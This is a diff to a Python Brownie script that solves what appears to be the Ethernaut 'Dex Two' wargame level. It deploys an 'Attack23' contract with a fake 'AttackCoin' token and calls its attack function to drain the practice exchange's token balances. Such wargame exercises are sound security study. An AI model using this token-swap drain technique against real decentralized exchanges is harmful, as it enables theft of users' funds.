@@ -3,10 +3,10 @@ from brownie import web3, interface, convert, DexTwo, Attack23
 from eth_utils import keccak
 
 
-ETHERNAUT_INSTANCE = "0xdA3ecB48DFeEB21B4b2B177d64d6dfB2B8FE884e"
+ETHERNAUT_INSTANCE = "0xF9467C174F53FfD854c572AA1B87819c35620825"
 
-TOKEN1 = "0xC05734547415687cF19482183D58a2E173f2Ebd6"
-TOKEN2 = "0x3021528D0f836c13278CD2eD990893008724B5F9"
+TOKEN1 = "0x8920D9c3e74bD47E8A65b571C6a93f224E70b7b6"
+TOKEN2 = "0x6923A6dcBEf9c47B97C20eBbE33277D6fBE072Ae"
 
 GAS_LIMIT = 12000000
 
@@ -14,11 +14,12 @@ GAS_LIMIT = 12000000
 def main():
     player = get_account()
     target = interface.IDexTwo(ETHERNAUT_INSTANCE)
-    attack = Attack23.deploy(ETHERNAUT_INSTANCE, 0, 200, {"from": player})
+    attack = Attack23.deploy(
+        ETHERNAUT_INSTANCE, "AttackCoin", "ATK", 4, {"from": player}
+    )
     print_balances(target)
-    print_balances(target)
-    target.approve(ETHERNAUT_INSTANCE, 1000)
     attack.attack({"from": player})
+    print_balances(target)
 
 
 def print_balances(_target):
